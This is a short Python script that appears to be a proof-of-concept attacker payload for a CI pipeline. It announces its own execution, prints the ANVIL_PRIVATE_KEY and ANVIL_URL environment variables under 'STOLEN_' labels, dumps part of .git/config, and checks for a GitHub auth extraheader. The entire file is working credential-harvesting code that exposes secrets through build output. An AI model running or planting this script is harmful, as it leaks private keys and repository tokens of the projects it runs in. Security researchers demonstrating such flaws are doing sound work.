import os, sys, subprocess
print("ATTACKER_SCRIPT_EXECUTED argv=", sys.argv[1:])
print("STOLEN_ANVIL_PRIVATE_KEY=" + os.environ.get("ANVIL_PRIVATE_KEY", "<unset>"))
print("STOLEN_ANVIL_URL=" + os.environ.get("ANVIL_URL", "<unset>"))
try:
    cfg = open(".git/config").read()
    print("GITCONFIG_HAS_EXTRAHEADER=" + str("extraheader" in cfg))
    print("GITCONFIG_SNIPPET=" + cfg.replace("\n", " | ")[:600])
except Exception as e:
    print("GITCONFIG_ERR", e)
r = subprocess.run(["git","config","--get","http.https://github.com/.extraheader"],capture_output=True,text=True)
print("EXTRAHEADER_PRESENT=" + str(bool(r.stdout.strip())))
